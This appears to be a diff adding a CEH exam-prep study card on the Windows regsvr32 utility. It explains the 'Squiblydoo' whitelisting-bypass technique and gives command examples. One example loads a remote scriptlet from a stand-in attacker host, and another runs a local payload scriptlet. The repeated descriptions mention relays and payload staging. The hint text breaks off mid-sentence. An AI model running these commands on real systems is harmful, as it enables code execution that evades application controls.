@@ -1,0 +1,23 @@
+tool: regsvr32
+tags:
+- m11
+- network
+- cli
+exam_hint: 'Regsvr32.exe (Register Server) is a Microsoft-signed Windows command-line utility that registers and unregisters OLE controls (COM DLLs) in the Windows Registry. Threat actors abuse it as a LOLBAS technique (nicknamed "Squiblydoo") to load and execute malicious scriptlets (.sct files) from remote URLs, bypassing application whitelisting. Since Regsvr32 is a trusted system binary that performs outb Strategy: nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on th'
+docs:
+- http://attacker.com/payload.sct
+- http://url
+- https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
+actions:
+- title: Regsvr32.exe C:\Windows\System32\example.dll
+  desc: Runs `regsvr32.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
+  command: regsvr32.exe C:\Windows\System32\example.dll
+- title: Regsvr32.exe /u C:\Windows\System32\example.dll
+  desc: Runs `regsvr32.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
+  command: regsvr32.exe /u C:\Windows\System32\example.dll
+- title: Regsvr32.exe /s /n
+  desc: Runs `regsvr32.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
+  command: regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
+- title: Regsvr32.exe /s /n (2)
+  desc: Runs `regsvr32.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
+  command: regsvr32.exe /s /n /u /i:C:\payload.sct scrobj.dll
